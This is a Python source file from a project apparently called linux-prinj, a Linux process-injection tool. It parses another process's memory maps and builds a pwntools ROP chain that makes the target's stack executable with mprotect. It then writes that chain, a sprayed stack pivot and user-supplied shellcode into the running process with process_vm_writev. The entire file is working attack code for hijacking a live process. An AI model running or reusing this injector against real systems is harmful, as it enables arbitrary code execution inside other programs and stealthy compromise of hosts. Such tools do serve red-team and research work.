#!/usr/bin/env python3
#
# This file is part of the linux-prinj project.
# https://gitlab.com/pgregoire/linux-prinj/
#
# Copyright 2022 Philippe Grégoire <git@pgregoire.xyz>
#
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <https://www.gnu.org/licenses/>.
#

import ctypes

from pwn import *


context.log_level = 'critical'

# -------------------------------------------------------------------- #
# libc

libc = None
def loadlibc(path):
    global libc

    libc = ctypes.CDLL(path)

    # process_vm_writev's signature
    libc.process_vm_writev.argtypes = [
        ctypes.c_uint32,
        ctypes.c_void_p,
        ctypes.c_uint64,
        ctypes.c_void_p,
        ctypes.c_uint64,
        ctypes.c_uint64,
    ]
    libc.process_vm_writev.restype = ctypes.c_int64


class iovec(ctypes.Structure):
    _fields_ = [
        ("iov_base", ctypes.c_void_p),
        ("iov_len", ctypes.c_ulong)
    ]

# -------------------------------------------------------------------- #
# /proc/

def getmaps(pid):
    with open('/proc/{}/maps'.format(pid)) as fp:
        dat = fp.read()

    r = []
    for ln in [e for e in dat.split('\n') if e]:
        s = [e for e in ln.split(' ') if e]
        r += [{
          'addr': s[0],
          'from': int(s[0].split('-')[0], 16),
          'to': int(s[0].split('-')[1], 16),
          'perms': s[1],
          'offset': int(s[2], 16),
          'dev': s[3],
          'devmaj': int(s[3].split(':')[0], 16),
          'devmin': int(s[3].split(':')[1], 16),
          'inode': int(s[4]),
          'path': None if 5 == len(s) else s[5],
        }]

    return r

# -------------------------------------------------------------------- #
# rop chain

def buildchain(libmap, stkmap):
    rop = ROP(libmap['path'])

    libc_base = libmap['from']
    stkbase = stkmap['from']
    stklen = stkmap['to'] - stkmap['from']

    pivot = b''
    pivot += p64(libc_base + rop.find_gadget(['pop rsp', 'ret']).address)
    pivot += p64(stkbase)

    entry = b''
    entry += p64(libc_base + rop.ret.address)
    entry += p64(libc_base + rop.ret.address)
    entry += p64(libc_base + rop.ret.address)
    entry += p64(libc_base + rop.ret.address)
    ## mprotect(stkbase, stklen, 7)
    entry += p64(libc_base + rop.rax.address)
    entry += p64(10) # sys_mprotect
    entry += p64(libc_base + rop.rdi.address)
    entry += p64(stkbase)
    entry += p64(libc_base + rop.rsi.address)
    entry += p64(stklen)
    entry += p64(libc_base + rop.rdx.address)
    entry += p64(7) # PROT_READ | PROT_WRITE | PROT_EXEC
    # rop.syscall is not necessarily followed by ret
    entry += p64(libc_base + rop.find_gadget(['syscall', 'ret']).address)
    # jmp back on the stack past this chain, on the shellcode
    entry += p64(stkbase + len(entry) + 8)

    return entry, pivot


def findlibc(maps):
    return [m for m in maps if m['path'] and '/libc-' in m['path']][0]


def findstack(maps):
    return [m for m in maps if '[stack]' == m['path']][0]

# -------------------------------------------------------------------- #

def wrmem(pid, addr, buf):
    sz = len(buf)
    bf = (ctypes.c_char*sz).from_buffer(bytearray(buf))
    lv = iovec(ctypes.cast(ctypes.byref(bf), ctypes.c_void_p), sz)
    rv = iovec(ctypes.c_void_p(addr), sz)
    libc.process_vm_writev(pid, ctypes.byref(lv), 1, ctypes.byref(rv), 1, 0)


if len(sys.argv) not in [2, 3]:
    print('inject <shellcode.bin> [pid]', file=sys.stderr)
    exit(1)

with open(sys.argv[1], 'rb') as fp:
    code = fp.read()

pid = int(sys.argv[2])

maps = getmaps(pid)
libc_map = findlibc(maps)
loadlibc(libc_map['path'])
stk_map = findstack(maps)

rop,rsp = buildchain(libc_map, stk_map)

# spray a stack pivot
spray_base = stk_map['from'] + len(code)
spray_base = spray_base + (8 - (spray_base % 8))
spray = (stk_map['to'] - spray_base) // len(rsp)
spray = spray * rsp
wrmem(pid, spray_base, spray)
wrmem(pid, stk_map['from'], rop + code)
